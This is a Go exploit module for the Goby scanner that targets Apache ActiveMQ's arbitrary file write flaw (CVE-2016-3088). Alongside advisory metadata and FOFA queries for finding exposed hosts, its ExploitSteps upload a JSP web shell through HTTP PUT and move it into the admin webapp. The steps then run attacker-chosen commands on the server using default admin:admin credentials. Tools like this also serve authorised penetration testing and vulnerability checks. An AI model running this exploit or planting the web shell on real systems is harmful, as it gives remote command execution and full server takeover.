package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "ActiveMQ Arbitrary File Write Vulnerability (CVE-2016-3088)",
    "Description": "<p>Apache ActiveMQ is the most popular open source, multi-protocol, Java-based message broker.</p><p>The Fileserver web application in Apache ActiveMQ 5.x before 5.14.0 allows remote attackers to upload and execute arbitrary files via an HTTP PUT followed by an HTTP MOVE request.</p>",
    "Product": "APACHE-ActiveMQ",
    "Homepage": "http://activemq.apache.org/",
    "DisclosureDate": "2016-01-06",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "((((title=\"Apache ActiveMQ\" || (port=\"8161\" && header=\"Server: Jetty\") || header=\"realm=\\\"ActiveMQRealm\") && header!=\"couchdb\" && header!=\"drupal\" && body!=\"Server: couchdb\") || (banner=\"server:ActiveMQ\" || banner=\"Magic:ActiveMQ\" || banner=\"realm=\\\"ActiveMQRealm\") || banner=\"Apache ActiveMQ\") || (((title=\"Apache ActiveMQ\" || (port=\"8161\" && header=\"Server: Jetty\") || header=\"realm=\\\"ActiveMQRealm\") && header!=\"couchdb\" && header!=\"drupal\" && body!=\"Server: couchdb\") || (banner=\"server:ActiveMQ\" || banner=\"Magic:ActiveMQ\" || banner=\"realm=\\\"ActiveMQRealm\") || banner=\"Apache ActiveMQ\")) && protocol!=\"activemq\" && protocol!=\"stomp\"",
    "GobyQuery": "((((title=\"Apache ActiveMQ\" || (port=\"8161\" && header=\"Server: Jetty\") || header=\"realm=\\\"ActiveMQRealm\") && header!=\"couchdb\" && header!=\"drupal\" && body!=\"Server: couchdb\") || (banner=\"server:ActiveMQ\" || banner=\"Magic:ActiveMQ\" || banner=\"realm=\\\"ActiveMQRealm\") || banner=\"Apache ActiveMQ\") || (((title=\"Apache ActiveMQ\" || (port=\"8161\" && header=\"Server: Jetty\") || header=\"realm=\\\"ActiveMQRealm\") && header!=\"couchdb\" && header!=\"drupal\" && body!=\"Server: couchdb\") || (banner=\"server:ActiveMQ\" || banner=\"Magic:ActiveMQ\" || banner=\"realm=\\\"ActiveMQRealm\") || banner=\"Apache ActiveMQ\")) && protocol!=\"activemq\" && protocol!=\"stomp\"",
    "Level": "3",
    "Impact": "<p>The Fileserver web application in Apache ActiveMQ 5.x before 5.14.0 allows remote attackers to upload and execute arbitrary files via an HTTP PUT followed by an HTTP MOVE request.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://activemq.apache.org/\">https://activemq.apache.org/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "http://www.zerodayinitiative.com/advisories/ZDI-16-357",
        "http://rhn.redhat.com/errata/RHSA-2016-2036.html"
    ],
    "Translation": {
        "CN": {
            "Name": "ActiveMQ 消息代理系统 fileserver 文件上传漏洞（CVE-2016-3088）",
            "Product": "APACHE-ActiveMQ",
            "Description": "<p>Apache ActiveMQ® 是最流行的开源、多协议、基于 Java 的消息代理。</p><p>Apache ActiveMQ 5.x 5.14.0 之前的文件服务器 Web 应用程序允许远程攻击者通过 HTTP PUT 和 HTTP MOVE 请求上传和执行任意文件。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://activemq.apache.org/\">https://activemq.apache.org/</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。<br>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "ActiveMQ Arbitrary File Write Vulnerability (CVE-2016-3088)",
            "Product": "APACHE-ActiveMQ",
            "Description": "<p>Apache ActiveMQ is the most popular open source, multi-protocol, Java-based message broker.</p><p>The Fileserver web application in Apache ActiveMQ 5.x before 5.14.0 allows remote attackers to upload and execute arbitrary files via an HTTP PUT followed by an HTTP MOVE request.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://activemq.apache.org/\">https://activemq.apache.org/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.<br>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>The Fileserver web application in Apache ActiveMQ 5.x before 5.14.0 allows remote attackers to upload and execute arbitrary files via an HTTP PUT followed by an HTTP MOVE request.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "PUT",
                "uri": "/fileserver/dsadwe.txt",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "wqeasdwqe"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "OR",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "204",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/fileserver/dsadwe.txt",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "wqeasdwqe",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "MOVE",
                "uri": "/fileserver/dsadwe.txt",
                "follow_redirect": true,
                "header": {
                    "Destination": "file:///opt/activemq/webapps/admin/s1w23.txt"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "204",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "PUT",
                "uri": "/fileserver/wshjkasd.txt",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "<%@ page import=\"java.io.*\" %>\n<%\ntry {\nString cmd = request.getParameter(\"cmd\");\nProcess child = Runtime.getRuntime().exec(cmd);\nInputStream in = child.getInputStream();\nint c;\nwhile ((c = in.read()) != -1) {\nout.print((char)c);\n}\nin.close();\ntry {\nchild.waitFor();\n} catch (InterruptedException e) {\ne.printStackTrace();\n}\n} catch (IOException e) {\nSystem.err.println(e);\n}\n%>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "OR",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "204",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "MOVE",
                "uri": "/fileserver/wshjkasd.txt",
                "follow_redirect": true,
                "header": {
                    "Destination": "file:///opt/activemq/webapps/admin/s123.jsp"
                },
                "data_type": "text",
                "data": "123"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "OR",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "204",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/admin/s123.jsp?cmd={{{cmd}}}",
                "follow_redirect": true,
                "header": {
                    "Authorization": "Basic YWRtaW46YWRtaW4="
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "OR",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        "CVE-2016-3088"
    ],
    "CNNVD": [
        "CNNVD-201605-596"
    ],
    "CNVD": [
        "CNVD-2016-03612"
    ],
    "CVSSScore": "9.6",
    "AttackSurfaces": {
        "Application": [
            "ActiveMQ"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10785"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}